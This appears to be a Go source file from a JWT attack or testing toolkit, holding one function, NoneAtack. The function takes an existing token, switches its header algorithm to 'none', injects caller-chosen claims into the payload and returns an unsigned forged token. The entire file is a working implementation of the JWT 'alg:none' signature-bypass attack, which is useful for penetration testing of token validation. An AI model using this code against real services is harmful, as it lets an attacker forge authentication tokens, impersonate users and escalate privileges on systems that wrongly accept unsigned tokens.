package jwt

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
)

func NoneAtack(tokenString string, newPayload map[string]interface{}) (string, error) {
	token, err := ParseToken(tokenString)
	if err != nil {
		return "", fmt.Errorf("failed to parse token: %v", err)
	}

	token.Header["alg"] = "none"
	token.Header["typ"] = "JWT"

	for key, value := range newPayload {
		token.Payload[key] = value
	}

	headerBytes, err := json.Marshal(token.Header)
	if err != nil {
		return "", fmt.Errorf("failed to marshal header: %v", err)
	}

	payloadBytes, err := json.Marshal(token.Payload)
	if err != nil {
		return "", fmt.Errorf("failed to marshal payload: %v", err)
	}

	headerEncoded := base64.RawURLEncoding.EncodeToString(headerBytes)
	payloadEncoded := base64.RawURLEncoding.EncodeToString(payloadBytes)

	newTokenString := fmt.Sprintf("%s.%s.", headerEncoded, payloadEncoded)
	return newTokenString, nil

}
